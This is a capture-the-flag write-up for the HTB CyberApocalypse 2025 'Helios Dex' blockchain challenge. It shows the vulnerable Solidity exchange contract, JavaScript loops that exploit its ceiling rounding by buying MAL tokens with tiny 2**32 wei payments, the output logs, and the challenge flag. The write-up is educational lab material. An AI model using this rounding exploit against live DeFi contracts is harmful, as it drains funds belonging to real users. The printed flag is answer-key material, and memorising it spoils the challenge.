---
published: 2025-04-02
series: CyberApocalypse 2025
tags:
- Blockchain
title: Helios Dex

---

HeliosDex is the second bloackchain challenge from HTB’s CyberApocaypse, this one was a funny one, three different ERC20 coins and 3 conversion function with weird roundings and a function to redeem the jackpot once you exploit the conversion error

```Solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}
```

So this one I used chatgpt pretty much, hoping with a good enough prompt it would manage to write a workable piece of code, but it refused to spit any sensible output.

I didn’t fully undersand wich value to put in order to exploit the rounding, or in which coin, so I started trying a little bit

```Solidity
    var last_balance = await check();
    for (let i = 60; i > 20; i--) {
        const amount = 2 ** i;
        await swap(amount);
        const new_balance = await check();
        const ethDiff = new_balance.playerBalanceEther - last_balance.playerBalanceEther;
        const eldorionDiff = new_balance.eldorionFangBalance - last_balance.eldorionFangBalance;
        const hlsDiff = new_balance.heliosLuminaShardsBalance - last_balance.heliosLuminaShardsBalance;
        const malDiff = new_balance.malakarEssenceBalance - last_balance.malakarEssenceBalance;
        
        const actualEldorianRatio = - eldorionDiff / ethDiff;
        const actualHlsRatio = - hlsDiff / ethDiff;
        const actualMalRatio = - malDiff / ethDiff;

        // console.log(`Amount: 2e${i} | EthDiff: ${ethDiff} | ELD Diff: ${eldorionDiff} | Actual Ratio: ${actualEldorianRatio}`);
        // console.log(`Amount: 2e${i} | EthDiff: ${ethDiff} | HLS Diff: ${hlsDiff} | Actual Ratio: ${actualHlsRatio}`);
        console.log(`Amount: 2e${i} | EthDiff: ${ethDiff} | MAL Diff: ${malDiff} | Actual Ratio: ${actualMalRatio}`);
        last_balance = new_balance; 
    }
```

I tried to reduce the amount of ether from around 1 progressively to zero, printing how much I paid the other ERC20 coin and actual conversion ratio.  
I discovered that with  
`MAL` you can still drop to `2**32 wei` still getting a whole `MAL`, for a whopping profit, so I just farmed 100 MAL, converted

  

```undefined
for (let i = 0; i < 100; i++) {
        await swap(2**32);
        const new_balance = await check();
        console.log(`ETH: ${new_balance.playerBalanceEther} | ELD: ${new_balance.eldorionFangBalance} | HLS: ${new_balance.heliosLuminaShardsBalance} | MAL: ${new_balance.malakarEssenceBalance}`);
    }
    
await redeem();
```

```Solidity
TH: 9.688486086037941212 | ELD: 0 | HLS: 0 | MAL: 87
ETH: 9.688415518742973916 | ELD: 0 | HLS: 0 | MAL: 88
ETH: 9.68834495144800662 | ELD: 0 | HLS: 0 | MAL: 89
ETH: 9.688274384153039324 | ELD: 0 | HLS: 0 | MAL: 90
ETH: 9.688203816858072028 | ELD: 0 | HLS: 0 | MAL: 91
ETH: 9.688133249563104732 | ELD: 0 | HLS: 0 | MAL: 92
ETH: 9.688062682268137436 | ELD: 0 | HLS: 0 | MAL: 93
ETH: 9.68799211497317014 | ELD: 0 | HLS: 0 | MAL: 94
ETH: 9.687921547678202844 | ELD: 0 | HLS: 0 | MAL: 95
ETH: 9.687850980383235548 | ELD: 0 | HLS: 0 | MAL: 96
ETH: 9.687780413088268252 | ELD: 0 | HLS: 0 | MAL: 97
ETH: 9.687709845793300956 | ELD: 0 | HLS: 0 | MAL: 98
ETH: 9.68763927849833366 | ELD: 0 | HLS: 0 | MAL: 99
ETH: 9.687568711203366364 | ELD: 0 | HLS: 0 | MAL: 100
```

Convert them back ( this last step was incredibly easy yet excruciating to set the manual gas limit ) as here is the flag

```Solidity
HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}
```